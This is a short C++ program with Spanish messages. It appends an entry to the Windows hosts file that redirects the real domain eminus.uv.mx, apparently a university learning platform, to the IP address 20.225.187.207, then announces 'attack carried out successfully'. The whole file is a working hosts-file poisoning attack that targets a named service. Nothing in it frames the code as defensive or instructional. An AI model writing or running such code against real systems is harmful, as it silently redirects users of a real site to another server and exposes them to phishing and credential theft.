#include <iostream>
#include <fstream>
using namespace std;

int main() {
    ofstream myfile("C:\\Windows\\System32\\drivers\\etc\\hosts", ios::out | ios::app);
    if (myfile.is_open()){
        myfile << "\n20.225.187.207 eminus.uv.mx";
        myfile.close();
        cout << "Ataque realizado con exito!!!\n";
    } else {
        cout << "El programa requiere permisos de administrador.\n";
    }

    cout << "Presione la tecla enter para salir...\n";
    cin.get();
    return 0;
}